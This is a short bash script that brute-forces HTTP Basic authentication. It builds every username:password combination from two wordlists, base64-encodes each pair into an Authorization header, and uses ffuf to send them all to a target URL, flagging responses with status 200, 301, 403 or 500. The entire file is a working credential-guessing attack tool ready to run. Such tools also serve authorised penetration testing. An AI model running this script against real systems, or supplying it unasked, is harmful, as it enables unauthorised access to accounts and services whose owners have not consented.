#!/bin/bash

command_exists () {
    type "$1" &> /dev/null ;
}

if ! command_exists curl || ! command_exists jq || ! command_exists base64 || ! command_exists ffuf ; then
    echo "Necessary command(s) not found. Attempting to install..."
    sudo apt-get update
    sudo apt-get install -y curl jq coreutils ffuf
fi

while getopts u:p:d: flag
do
    case "${flag}" in
        u) USERNAME_WORDLIST=${OPTARG};;
        p) PASSWORD_WORDLIST=${OPTARG};;
        d) DOMAIN=${OPTARG};;
    esac
done

if [ -z "$USERNAME_WORDLIST" ] || [ -z "$PASSWORD_WORDLIST" ] || [ -z "$DOMAIN" ]; then
    echo "Usage: $0 -u usernames.txt -p passwords.txt -d domain"
    exit 1
fi

USERNAME_WORDLIST_SIZE=$(wc -l "$USERNAME_WORDLIST" | awk '{print $1;}')
PASSWORD_WORDLIST_SIZE=$(wc -l "$PASSWORD_WORDLIST" | awk '{print $1;}')
OUTPUT_WORDLIST_SIZE=$((USERNAME_WORDLIST_SIZE * PASSWORD_WORDLIST_SIZE))
AUTH_FILE="auth.txt"

printf "\nGenerating HTTP basic authentication strings. This can take a while depending on the length of user and password lists.\n\n" >&2
printf "Usernames: %s\n" "$USERNAME_WORDLIST_SIZE" >&2
printf "Passwords: %s\n" "$PASSWORD_WORDLIST_SIZE" >&2
printf "Total combinations: %s\n\n" "$OUTPUT_WORDLIST_SIZE" >&2

rm -f "$AUTH_FILE"

while IFS= read -r user
do
    while IFS= read -r password
    do
        printf "Basic %s\n" "$(printf "%s:%s" "$user" "$password" | base64)" >> "$AUTH_FILE"
    done < "$PASSWORD_WORDLIST"
done < "$USERNAME_WORDLIST"

printf "\nRunning ffuf with generated auth combinations...\n\n" >&2
ffuf -w "$AUTH_FILE" -H "Authorization: FUZZ" -u "$DOMAIN" -mc 200,301,403,500

rm -rf auth.txt
